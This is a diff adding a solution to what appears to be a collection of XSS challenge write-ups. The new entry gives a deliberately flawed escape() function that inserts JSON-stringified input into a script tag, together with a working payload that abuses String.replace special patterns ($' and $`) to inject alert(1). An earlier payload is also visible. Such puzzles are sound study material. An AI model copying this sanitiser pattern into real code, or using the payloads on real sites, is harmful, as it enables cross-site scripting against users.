@@ -310,8 +310,15 @@ function escape(s) {
 Payload: `];alert(1)//\`
 
 ## %level%
-> TODO
-
+```js
+// submitted anonymously
+function escape(s) {
+    const userInput = JSON.stringify(s).replace(/[<]/g, '%lt').replace(/[>]/g, '%gt');
+    const userTemplate = '<script>let some = %userData%</script>';
+    return userTemplate.replace(/%userData%/, userInput);
+}
+```
+Payload: ```$'$`alert(1);//``` thank to `https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace?retiredLocale=vi`
 
 
 
